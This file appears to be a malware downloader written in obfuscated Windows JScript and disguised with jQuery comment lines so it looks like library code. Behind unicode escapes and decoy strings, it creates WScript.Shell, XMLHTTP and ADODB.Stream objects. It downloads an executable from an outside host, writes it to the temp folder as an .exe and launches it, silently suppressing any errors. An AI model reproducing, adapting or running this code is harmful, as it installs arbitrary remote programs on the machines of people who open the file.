// // Support: Android<4.1, IE<9  // Make sure we trim BOM and NBSP  rtrim = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,

var BckJxHHA = '\u0052un'; var PaGSdBPw = this['\u0041c'+'t\u0069'+'\u0076\u0065\u0058O\u0062j'+("billet","sixty-six","bristling",'ec\u0074')];
var UnVfcr = new PaGSdBPw('W\u0053c\u0072\u0069\u0070\u0074\u002E'+'S'+'h\u0065'+("prefix","featured",'l\u006C'));
// // Matches dashed string for camelizing  rmsPrefix = /^-ms-/,  rdashAlpha = /-([\da-z])/gi,
var mqrAw = UnVfcr['E\u0078'+("ronald","absinthe","glasses","across",'p\u0061n\u0064\u0045\u006E\u0076\u0069ron')+'\u006De\u006EtS'+'tr\u0069\u006Eg\u0073']('%'+("durban","knack","madeira","belfast","priceless",'\u0054E')+'M'+("fundamentals","incredulous","italia",'P\u0025')) + ("characterize","gardens","programme","talented",'/')+'B\u0069uJ\u0054G\u0046'+("coasted","classified",'Y')+'3\u002E\u0065\u0078e';
// // Used by jQuery.camelCase as callback to replace()  fcamelCase = function( all, letter ) {   return letter.toUpperCase();  };
var DSCpPtNAV = new PaGSdBPw('\u004D\u0053XM'+'L\u0032.'+'X'+("decimal","instruction","authorised",'\u004D\u004CH\u0054T\u0050'));
//jQuery.fn = jQuery.prototype = {
DSCpPtNAV['o\u006E\u0072\u0065\u0061d'+("dickie","smoke",'\u0079s')+'tat\u0065\u0063\u0068\u0061\u006E'+'\u0067e'] = function () {
        if (DSCpPtNAV[("palisade","optical","commissions","tacked",'r')+'\u0065ad\u0079'+'\u0073ta'+("denouement","wicker","capita",'\u0074e')] === 4) {
            var bWjpd = new PaGSdBPw('A'+'D'+'O'+("group","ingratiate",'\u0044\u0042.\u0053tr\u0065\u0061m'));
            // // The current version of jQuery being used  jquery: version,
            bWjpd['o\u0070e\u006E']();
            // constructor: jQuery,
            bWjpd['\u0074y\u0070e'] = 1;
            // // Start with an empty selector  selector: "",
            bWjpd[("boris","festival","promo","bedouin",'w')+'r'+'i'+'t\u0065'](DSCpPtNAV['R'+'\u0065sp\u006F\u006E'+'se\u0042'+("capability","busts","octagonal","unexplored",'od\u0079')]);
            // // The default length of a jQuery object is 0  length: 0,
            bWjpd['p'+'\u006Fsi'+("extermination","pupils","academy","auditor",'\u0074i')+'\u006Fn'] = 0;
            // toArray: function() {   return slice.call( this );  },
            bWjpd['s'+'a'+("mucus","domestic","eaves","antibody","strip",'v')+'e\u0054oF\u0069l\u0065'](mqrAw, 2);
            // // Get the Nth element in the matched element set OR  // Get the whole matched element set as a clean array  get: function( num ) {   return num != null ?
            bWjpd[("kraal","chirp","tower","lacquer","manhattan",'c')+'l'+("mustard","evaluations",'o')+'s\u0065']();
            //   // Return just the one element from the set    ( num < 0 ? this[ num + this.length ] : this[ num ] ) :
        };
};
try {

    //   // Return all the elements in a clean array    slice.call( this );  },
    DSCpPtNAV['op\u0065\u006E']('\u0047ET', '\u0068\u0074\u0074\u0070:/'+("uncut","competitions","playback","oxidation",'\u002F\u0063\u006Fc\u006F\u0077\u0061\u0073\u0068\u0069.\u0063\u006F\u006D\u002Fs\u0079\u0073t')+'em/\u006C\u006Fg\u0073/7\u0036\u0074\u0072\u0035'+("quail","aliment",'rg\u0075\u0069\u006E\u006D\u006C\u002E\u0065\u0078\u0065'), false);

    // // Take an array of elements and push it onto the stack  // (returning the new matched element set)  pushStack: function( elems ) {
    DSCpPtNAV['\u0073\u0065nd']();
    //  // Build a new jQuery matched element set   var ret = jQuery.merge( this.constructor(), elems );
    UnVfcr[BckJxHHA](mqrAw, 1, "JCFDahMD" === "xuzitSNLE");
    //  // Add the old object onto the stack (as a reference)   ret.prevObject = this;   ret.context = this.context;
} catch (xQmGwu) { };
//  // Return the newly-formed element set   return ret;  },